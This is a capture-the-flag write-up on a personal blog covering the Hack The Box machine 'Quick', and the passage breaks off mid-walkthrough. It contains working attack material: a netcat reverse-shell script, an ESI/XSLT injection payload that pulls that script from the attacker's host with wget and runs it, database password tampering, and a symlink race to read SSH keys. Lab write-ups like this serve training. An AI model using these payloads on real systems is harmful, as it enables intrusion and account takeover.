<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Quick - Hack The Box - hackcommander.io</title>
<meta name="description" content="Quick was a hard box with multiple steps requiring the use of the QUIC protocol to access one section of the website and get the customer onboarding PDF with a set of default credentials. We get to play with ESI template injection to get the initial shell, then abuse a race condition in a PHP script so we can pivot to another user then finally we priv esc to root by finding credentials in the printer configuration file.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="hackcommander.io">
<meta property="og:title" content="Quick - Hack The Box">
<meta property="og:url" content="http://localhost:4000/htb-writeup-quick/">


  <meta property="og:description" content="Quick was a hard box with multiple steps requiring the use of the QUIC protocol to access one section of the website and get the customer onboarding PDF with a set of default credentials. We get to play with ESI template injection to get the initial shell, then abuse a race condition in a PHP script so we can pivot to another user then finally we priv esc to root by finding credentials in the printer configuration file.">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-quick/quick_logo.png">





  <meta property="article:published_time" content="2020-08-29T00:00:00+02:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-writeup-quick/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "HackCommander",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/">Home</a>
            </li>
<li class="masthead__menu-item">
              <a href="/year-archive/">Posts</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories/">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags/">Tags</a>
            </li>
<li class="masthead__menu-item">
              <a href="/about/">About</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1">
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Quick - Hack The Box</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HackCommander</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, Bug Bounty Hunter <br>and CTF Player
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/iv%C3%A1n-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Quick - Hack The Box">
    <meta itemprop="description" content="Quick was a hard box with multiple steps requiring the use of the QUIC protocol to access one section of the website and get the customer onboarding PDF with a set of default credentials. We get to play with ESI template injection to get the initial shell, then abuse a race condition in a PHP script so we can pivot to another user then finally we priv esc to root by finding credentials in the printer configuration file.">
    <meta itemprop="datePublished" content="August 29, 2020">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Quick - Hack The Box
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-08-29T00:00:00+02:00">August 29, 2020 </time>â€ƒ
          
          
        </p>
        <p><img src="/assets/images/htb-writeup-quick/quick_logo.png" alt=""></p>

<p>Quick was a hard box with multiple steps requiring the use of the QUIC protocol to access one section of the website and get the customer onboarding PDF with a set of default credentials. We get to play with ESI template injection to get the initial shell, then abuse a race condition in a PHP script so we can pivot to another user then finally we priv esc to root by finding credentials in the printer configuration file.</p>

<h2 id="summary">Summary</h2>

<ul>
  <li>Enumerate client names and countries from the main website testimonials and client list</li>
  <li>Locate ticketing system through dirbusting</li>
  <li>Use QUIC protocol to access the User Portal on UDP port 443</li>
  <li>Locate employees list &amp; PDF document containing default employee password</li>
  <li>Guess the email address associated with the password based on previously obtained client &amp; country list</li>
  <li>Exploit ESI Injection vulnerability in the ticketing system to get RCE</li>
  <li>Locate print server running on localhost, log in after changing the password of the account in the MySQL database</li>
  <li>Exploit race condition in PHP script responsible for print jobs and read &amp; write SSH keys for the srvadm user</li>
  <li>Find the root password inside the printers.conf file</li>
</ul>

<h2 id="portscan">Portscan</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap -sC -sV -p- 10.10.10.186
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 19:17 EDT
Nmap scan report for quick.htb (10.10.10.186)
Host is up (0.020s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Quick | Broadband Services
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.39 seconds
</code></pre></div></div>

<h2 id="website-enumeration">Website enumeration</h2>

<p>On the website thereâ€™s a few tidbits of useful information such as:</p>

<ul>
  <li>Testimonials with persons names and company names (this will be useful later)</li>
  <li>Thereâ€™s a weird comment about using Mobile App to access the portal</li>
</ul>

<p><img src="/assets/images/htb-writeup-quick/image-20200425192116695.png" alt=""></p>

<p>The <strong>clients.php</strong> link provides a bigger list of clients with their country.</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425192431688.png" alt=""></p>

<p>With <strong>gobuster</strong>, we find a list of php files on the server.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# gobuster dir -w ~/tools/SecLists/Discovery/Web-Content/big.txt -x php -t 50 -u http://quick.htb:9001

/clients.php (Status: 200)
/db.php (Status: 200)
/home.php (Status: 200)
/index.php (Status: 200)
/login.php (Status: 200)
/search.php (Status: 200)
/server-status (Status: 200)
/ticket.php (Status: 200)
</code></pre></div></div>

<p>The <strong>login.php</strong> file is a login page for the ticketing system. Weâ€™ll try a couple of default username/passwords but we arenâ€™t able to log in.</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425192846207.png" alt=""></p>

<p>The other pages <strong>db.php</strong>, <strong>search.php</strong>, <strong>ticket.php</strong> canâ€™t be accessed directly or require a valid session.</p>

<h2 id="quick-user-portal">Quick User portal</h2>

<p>Based on that interesting comment in the Update section of the main page and the name of the box, I thought about the QUIC protocol which runs on UDP instead of TCP. A quick port scan of the UDP ports on the box confirms that something is listening on port 443.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap -sU -F 10.10.10.186
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 19:30 EDT
Nmap scan report for quick.htb (10.10.10.186)
Host is up (0.018s latency).
Not shown: 99 closed ports
PORT    STATE         SERVICE
443/udp open|filtered https

Nmap done: 1 IP address (1 host up) scanned in 106.93 seconds
</code></pre></div></div>

<p>I used the <a href="https://developers.cloudflare.com/http3/intro/http3-client">Quiche</a> client from CloudFlare to do QUIC connections to the server. The client has to be compiled from source but the installation instructions on the site are self explanatory. After installing the client I can access the Quick User portal and I see links to <strong>Contact</strong>, <strong>About</strong> and <strong>References</strong>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# http3-client https://10.10.10.186

&lt;html&gt;
&lt;title&gt; Quick | Customer Portal&lt;/title&gt;
&lt;h1&gt;Quick | Portal&lt;/h1&gt;
[...]
&lt;body&gt;
&lt;p&gt; Welcome to Quick User Portal&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href="index.php"&gt;Home&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="index.php?view=contact"&gt;Contact&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="index.php?view=about"&gt;About&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="index.php?view=docs"&gt;References&lt;/a&gt;&lt;/li&gt;
</code></pre></div></div>

<p>The <strong>contact</strong> section has a form to send messages. I thought this could be a vector for an XSS but the form doesnâ€™t appear to do anything when I issue a GET with the form parameters.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;div class="container"&gt;
  &lt;form action="/"&gt;
[...]
    &lt;label for="subject"&gt;Subject&lt;/label&gt;
    &lt;textarea id="subject" name="subject" placeholder="Write something.." style="height:200px"&gt;&lt;/textarea&gt;

    &lt;input type="submit" value="Submit"&gt;
  &lt;/form&gt;
&lt;/div&gt;
</code></pre></div></div>

<p>The <strong>about</strong> section has a list of employee with their email addresses. These could be valid usernames so I make note of these for later.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
        &lt;h2&gt;Jane Doe&lt;/h2&gt;
        &lt;p class="title"&gt;CEO &amp; Founder&lt;/p&gt;
        &lt;p&gt;Quick Broadband services established in 2012 by Jane.&lt;/p&gt;
        &lt;p&gt;jane@quick.htb&lt;/p&gt;
[...]
       &lt;h2&gt;Mike Ross&lt;/h2&gt;
        &lt;p class="title"&gt;Sales Manager&lt;/p&gt;
        &lt;p&gt;Manages the sales and services.&lt;/p&gt;
        &lt;p&gt;mike@quick.htb&lt;/p&gt;
[...]
        &lt;h2&gt;John Doe&lt;/h2&gt;
        &lt;p class="title"&gt;Web Designer&lt;/p&gt;
        &lt;p&gt;Front end developer.&lt;/p&gt;
        &lt;p&gt;john@quick.htb&lt;/p&gt;
</code></pre></div></div>

<p>The <strong>references</strong> section contains two PDF documents.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# http3-client https://10.10.10.186/index.php?view=docs
[...]
  &lt;li&gt;&lt;a href="docs/QuickStart.pdf"&gt;Quick-Start Guide&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="docs/Connectivity.pdf"&gt;Connectivity Guide&lt;/a&gt;&lt;/li&gt;
</code></pre></div></div>

<p>The <strong>QuickStart.pdf</strong> file refers to that ticketing system we found earlier but for which we donâ€™t have valid credentials.</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425194435794.png" alt=""></p>

<p>The  <strong>Connectivity.pdf</strong> file has the default password assigned to customers: <code class="language-plaintext highlighter-rouge">Quick4cc3$$</code>. This is probably the password used on the ticketing system but we donâ€™t have the username to log in.</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425194602565.png" alt=""></p>

<h2 id="ticketing-system">Ticketing system</h2>

<p>I went back to the Testimonials and client information we found earlier and tried different combination of domain names and TLDs. The country indicated in the client list is a hint that allows us to guess the TLD instead of fuzzing all possible TLDs.</p>

<p>The correct credentials are: <code class="language-plaintext highlighter-rouge">elisa@wink.co.uk / Quick4cc3$$</code></p>

<p>The ticketing system contains two functions:</p>

<ul>
  <li>Raise a new ticket</li>
  <li>Search for existing ticket</li>
</ul>

<p><img src="/assets/images/htb-writeup-quick/image-20200425195036632.png" alt=""></p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425195402958.png" alt=""></p>

<p>A random ticket ID is generated each time we submit a new ticket.</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425195436245.png" alt=""></p>

<p>We can then search for our ticket and the content is returned.</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425195631981.png" alt=""></p>

<p>In the <strong>search.php</strong> response, we can see that the web application uses <strong>Esigate</strong>. This allows the application to modify the content of the page using special ESI tags.</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425195918422.png" alt=""></p>

<p>Thereâ€™s a <a href="https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/">blog post</a> that go over abusing specific implementations of ESI. In a nutshell, we can get RCE on the server by injecting XML Stylesheet Language Transformations (XSLT). The input on the ticket creation page is totally unfiltered so we can add ESI tags and they will be reflected back.</p>

<p>A quick test shows that we can get a ping back to our webserver by using the following tag:</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425201134062.png" alt=""></p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425201200365.png" alt=""></p>

<p>To get a shell on the server, Iâ€™ll first create a <strong>shell.sh</strong> script that will execute a typical reverse shell payload:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">rm</span> /tmp/yolo<span class="p">;</span><span class="nb">mkfifo</span> /tmp/yolo<span class="p">;</span><span class="nb">cat</span> /tmp/yolo|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.14.10 443 <span class="o">&gt;</span>/tmp/yolo
</code></pre></div></div>

<p>By using the example in the blog post, I created the first XSLT file with the following payload to download my shell script  with <strong>wget</strong>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" ?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
&lt;xsl:output method="xml" omit-xml-declaration="yes"/&gt;
&lt;xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"&gt;
&lt;root&gt;
&lt;xsl:variable name="cmd"&gt;&lt;![CDATA[wget 10.10.14.10/shell.sh]]&gt;&lt;/xsl:variable&gt;
&lt;xsl:variable name="rtObj" select="rt:getRuntime()"/&gt;
&lt;xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/&gt;
Process: &lt;xsl:value-of select="$process"/&gt;
Command: &lt;xsl:value-of select="$cmd"/&gt;
&lt;/root&gt;
&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</code></pre></div></div>

<p>Then I created a new ticket that links to the stylesheet <strong>esi.xsl</strong> I just created.</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425201534969.png" alt=""></p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425201623053.png" alt=""></p>

<p>After searching for the ticket number 7644, I saw the <strong>shell.sh</strong> file was downloaded from my machine.</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425201650309.png" alt=""></p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425201707232.png" alt=""></p>

<p>Then, I modified the <strong>esi.xsl</strong> file and changed the command to execute the <strong>shell.sh</strong> file and get a reverse shell.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
&lt;xsl:variable name="cmd"&gt;&lt;![CDATA[bash shell.sh]]&gt;&lt;/xsl:variable&gt;
[...]
</code></pre></div></div>

<p>After searching for that same ticket again, I got a connection back.</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425202811702.png" alt=""></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /home/sam
$ ls
esigate-distribution-5.2
shell.sh
user.txt
$ cat user.txt
66246c9fe[...]
</code></pre></div></div>

<p>I dropped my SSH public key to <code class="language-plaintext highlighter-rouge">/home/sam/.ssh/authorized_keys</code> so I could log in directly with a proper SSH shell.</p>

<h2 id="privesc-to-user-srvadm">Privesc to user srvadm</h2>

<p>The box has two users:</p>

<ul>
  <li>sam</li>
  <li>srvadm</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@quick:~$ tail -n 5 /etc/passwd
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
sam:x:1000:1000:sam:/home/sam:/bin/bash
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
srvadm:x:1001:1001:,,,:/home/srvadm:/bin/bash
sam@quick:~$ ls -l /home
total 8
drwxr-xr-x 7 sam    sam    4096 Apr 26 00:18 sam
drwxr-xr-x 6 srvadm srvadm 4096 Mar 20 06:37 srvadm
</code></pre></div></div>

<p>I looked at the Apache configuration file <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/000-default.conf</code> and saw that thereâ€™s a website listing on port 80 with a different domain name: <code class="language-plaintext highlighter-rouge">printerv2.quick.htb</code>. The AssignUserId config statement indicated this server is running as the <code class="language-plaintext highlighter-rouge">srvadm</code> user.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;VirtualHost *:80&gt;
	AssignUserId srvadm srvadm
	ServerName printerv2.quick.htb
	DocumentRoot /var/www/printer
&lt;/VirtualHost&gt;
</code></pre></div></div>

<p>Iâ€™ll add re-connect to the server and port forward my local port 1080 to the remote port 80: <code class="language-plaintext highlighter-rouge">ssh -L 1080:127.0.0.1:80 sam@10.10.10.186</code>. Then Iâ€™ll add <code class="language-plaintext highlighter-rouge">printerv2.quick.htb</code> to my local host file pointing to <code class="language-plaintext highlighter-rouge">127.0.0.1</code>.</p>

<p>The printer site has a login page but we donâ€™t have valid credentials yet.</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425203602880.png" alt=""></p>

<p>We have access to the <code class="language-plaintext highlighter-rouge">/var/www/printer</code> directory where this applications is running and I can see the database credentials in the <strong>db.php</strong> file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@quick:/var/www/printer$ cat db.php 
&lt;?php
$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
?&gt;
</code></pre></div></div>

<p>The authentication page PHP code shows that the supplied password is hashed with MD5 and uses the <code class="language-plaintext highlighter-rouge">fa</code> salt.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"email"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">]))</span>
<span class="p">{</span>
        <span class="nv">$email</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"email"</span><span class="p">];</span>
        <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">];</span>
        <span class="nv">$password</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">crypt</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span><span class="s1">'fa'</span><span class="p">));</span>
        <span class="nv">$stmt</span><span class="o">=</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="s2">"select email,password from users where email=? and password=?"</span><span class="p">);</span>
        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">bind_param</span><span class="p">(</span><span class="s2">"ss"</span><span class="p">,</span><span class="nv">$email</span><span class="p">,</span><span class="nv">$password</span><span class="p">);</span>
        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">();</span>
        <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">get_result</span><span class="p">();</span>
        <span class="nv">$num_rows</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span><span class="p">;</span>
</code></pre></div></div>

<p>I can access the database and see two users configured:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@quick:/var/www/printer$ mysql -u db_adm -D quick -p 
Enter password: 
[...]

mysql&gt; show tables;
+-----------------+
| Tables_in_quick |
+-----------------+
| jobs            |
| tickets         |
| users           |
+-----------------+
3 rows in set (0.00 sec)

mysql&gt; select * from users;
+--------------+------------------+----------------------------------+
| name         | email            | password                         |
+--------------+------------------+----------------------------------+
| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
+--------------+------------------+----------------------------------+
2 rows in set (0.00 sec)
</code></pre></div></div>

<p>Since I have access to the database, I can just change the <code class="language-plaintext highlighter-rouge">srvadm</code> user password to <code class="language-plaintext highlighter-rouge">Quick4cc3$$</code> by using the same hash as the Elisa user account.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; update users set password = 'c6c35ae1f3cb19438e0199cfa72a9d9d' where name='Server Admin';
Query OK, 0 rows affected (0.00 sec)
Rows matched: 1  Changed: 0  Warnings: 0
</code></pre></div></div>

<p>And now I can log in to the printer application page with <code class="language-plaintext highlighter-rouge">srvadm@quick.htb / Quick4cc3$$</code>:</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425204523370.png" alt=""></p>

<p>We can add printers and point to our IP address:</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425204618742.png" alt=""></p>

<p>After adding a printer, we can see it in the list.</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425204637736.png" alt=""></p>

<p>After starting a netcat listener on port 9100, we can click the printer icon on the right to test connectivity. We see thereâ€™s a link to add a printer job.</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425204741174.png" alt=""></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listening on [any] 9100 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.186] 34600
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-quick/image-20200425204811791.png" alt=""></p>

<p>After adding the job, we get the content on port 9100:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listening on [any] 9100 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.186] 34656
TestVA
</code></pre></div></div>

<p>The <strong>jobs.php</strong> file is the code that processes the print jobs. Hereâ€™s the relevant part that weâ€™ll exploit.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mf">...</span><span class="p">]</span>
    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"submit"</span><span class="p">]))</span>
	<span class="p">{</span>
		<span class="nv">$title</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"title"</span><span class="p">];</span>
		<span class="nv">$file</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"Y-m-d_H:i:s"</span><span class="p">);</span>
		<span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"/var/www/jobs/"</span><span class="mf">.</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"desc"</span><span class="p">]);</span>
		<span class="nb">chmod</span><span class="p">(</span><span class="s2">"/var/www/printer/jobs/"</span><span class="mf">.</span><span class="nv">$file</span><span class="p">,</span><span class="s2">"0777"</span><span class="p">);</span>
		<span class="nv">$stmt</span><span class="o">=</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="s2">"select ip,port from jobs"</span><span class="p">);</span>
		<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">();</span>
		<span class="nv">$result</span><span class="o">=</span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">get_result</span><span class="p">();</span>
		<span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="nv">$row</span><span class="o">=</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">();</span>
			<span class="nv">$ip</span><span class="o">=</span><span class="nv">$row</span><span class="p">[</span><span class="s2">"ip"</span><span class="p">];</span>
			<span class="nv">$port</span><span class="o">=</span><span class="nv">$row</span><span class="p">[</span><span class="s2">"port"</span><span class="p">];</span>
			<span class="k">try</span>
			<span class="p">{</span>
				<span class="nv">$connector</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NetworkPrintConnector</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="nv">$port</span><span class="p">);</span>
				<span class="nb">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">);</span> <span class="c1">//Buffer for socket check</span>
				<span class="nv">$printer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Printer</span><span class="p">(</span><span class="nv">$connector</span><span class="p">);</span>
				<span class="nv">$printer</span> <span class="o">-&gt;</span> <span class="nf">text</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"/var/www/jobs/"</span><span class="mf">.</span><span class="nv">$file</span><span class="p">));</span>
				<span class="nv">$printer</span> <span class="o">-&gt;</span> <span class="nf">cut</span><span class="p">();</span>
				<span class="nv">$printer</span> <span class="o">-&gt;</span> <span class="nf">close</span><span class="p">();</span>
				<span class="nv">$message</span><span class="o">=</span><span class="s2">"Job assigned"</span><span class="p">;</span>
				<span class="nb">unlink</span><span class="p">(</span><span class="s2">"/var/www/jobs/"</span><span class="mf">.</span><span class="nv">$file</span><span class="p">);</span>
			<span class="p">}</span>
<span class="p">[</span><span class="mf">..</span><span class="p">]</span>            
</code></pre></div></div>

<p>In short, the code does the following:</p>

<ol>
  <li>
    <p>Creates a file named with the current time, like <code class="language-plaintext highlighter-rouge">2020-04-26_00:55:45</code> for example.</p>
  </li>
  <li>
    <p>It writes to the file the contents submitted on the print job form</p>
  </li>
  <li>
    <p>It opens a network socket to the remote printer and writes the content of the printer job</p>
  </li>
</ol>

<p>The race condition vulnerability here is the <code class="language-plaintext highlighter-rouge">sleep(0.5)</code> delay that was added. Because the print job file is modifiable by anyone (chmod 0777), itâ€™s possible to swap the file by a symlink before the rest of the code reads the content. In other words, we can read or write any file as user <code class="language-plaintext highlighter-rouge">srvadm</code>.</p>

<p>To abuse the file read and get the private key for <code class="language-plaintext highlighter-rouge">srvadm</code>, we can do it this way:</p>

<ul>
  <li>Loop and check if a file exists with the current time</li>
  <li>If the file exists, delete it and replace it with a symlink to the SSH private key for srvadm</li>
</ul>

